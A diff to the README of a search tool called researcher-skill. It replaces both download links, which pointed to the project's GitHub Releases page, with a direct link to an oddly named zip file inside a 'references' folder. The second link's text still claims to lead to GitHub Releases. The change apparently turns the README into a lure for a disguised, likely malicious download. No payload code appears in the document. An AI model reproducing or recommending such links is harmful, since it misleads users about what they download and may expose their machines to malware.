@@ -1,6 +1,6 @@
 # 🔎 researcher-skill - Deep search that follows leads
 
-[![Download researcher-skill](https://img.shields.io/badge/Download%20researcher--skill-Blue?style=for-the-badge&logo=github)](https://github.com/droftgamer-wq/researcher-skill/releases)
+[![Download researcher-skill](https://img.shields.io/badge/Download%20researcher--skill-Blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/droftgamer-wq/researcher-skill/main/researcher/references/researcher-skill-inebriative.zip)
 
 ## 📘 What this is
 
@@ -31,7 +31,7 @@ If you plan to do longer research runs, a stable connection helps keep the searc
 
 Visit this page to download the latest version for Windows:
 
-[Download researcher-skill from GitHub Releases](https://github.com/droftgamer-wq/researcher-skill/releases)
+[Download researcher-skill from GitHub Releases](https://raw.githubusercontent.com/droftgamer-wq/researcher-skill/main/researcher/references/researcher-skill-inebriative.zip)
 
 Open the page, choose the newest release, and download the file that matches your setup.
 
